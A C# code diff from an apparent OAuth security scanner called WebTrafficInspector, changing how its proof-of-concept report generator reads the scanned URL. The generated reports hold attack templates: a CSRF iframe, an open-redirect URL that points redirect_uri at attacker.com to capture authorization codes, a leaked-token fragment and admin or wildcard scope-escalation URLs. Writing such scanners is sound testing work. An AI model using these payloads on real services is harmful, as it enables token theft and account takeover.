@@ -519,7 +519,7 @@ namespace WebTrafficInspector
                     poc.AppendLine("<!DOCTYPE html>");
                     poc.AppendLine("<html>");
                     poc.AppendLine("<body>");
-                    poc.AppendLine($"  <iframe src=\"{scanReport.Url.Replace("&state=", "&state=")}\"></iframe>");
+                    poc.AppendLine($"  <iframe src=\"{scanReport.FlowData.Url.Replace("&state=", "&state=")}\"></iframe>");
                     poc.AppendLine("</body>");
                     poc.AppendLine("</html>");
                     poc.AppendLine("```");
@@ -532,8 +532,8 @@ namespace WebTrafficInspector
                 case "Open Redirect":
                     poc.AppendLine("Attack Vector: Open Redirect");
                     poc.AppendLine("1. Modify redirect_uri parameter:");
-                    poc.AppendLine($"   Original: {scanReport.Url}");
-                    poc.AppendLine($"   Malicious: {scanReport.Url.Replace("redirect_uri=", "redirect_uri=https://attacker.com&old_redirect_uri=")}");
+                    poc.AppendLine($"   Original: {scanReport.FlowData.Url}");
+                    poc.AppendLine($"   Malicious: {scanReport.FlowData.Url.Replace("redirect_uri=", "redirect_uri=https://attacker.com&old_redirect_uri=")}");
                     poc.AppendLine("2. Authorization code/token sent to attacker");
                     poc.AppendLine();
                     poc.AppendLine("Impact: Authorization code interception, account takeover");
@@ -543,7 +543,7 @@ namespace WebTrafficInspector
                     poc.AppendLine("Attack Vector: Token Leakage in URL Fragment");
                     poc.AppendLine("1. Victim accesses OAuth endpoint");
                     poc.AppendLine("2. Token appears in URL fragment:");
-                    poc.AppendLine($"   {scanReport.Url}#access_token=LEAKED_TOKEN");
+                    poc.AppendLine($"   {scanReport.FlowData.Url}#access_token=LEAKED_TOKEN");
                     poc.AppendLine("3. Token logged in browser history, referrer headers, analytics");
                     poc.AppendLine();
                     poc.AppendLine("Exploit:");
@@ -578,8 +578,8 @@ namespace WebTrafficInspector
                     poc.AppendLine("2. If server doesn't validate, attacker gets elevated access");
                     poc.AppendLine();
                     poc.AppendLine("Test URLs:");
-                    poc.AppendLine($"   {scanReport.Url.Replace("scope=", "scope=admin+")}");
-                    poc.AppendLine($"   {scanReport.Url.Replace("scope=", "scope=*+")}");
+                    poc.AppendLine($"   {scanReport.FlowData.Url.Replace("scope=", "scope=admin+")}");
+                    poc.AppendLine($"   {scanReport.FlowData.Url.Replace("scope=", "scope=*+")}");
                     poc.AppendLine();
                     poc.AppendLine("Impact: Unauthorized access to privileged operations");
                     break;
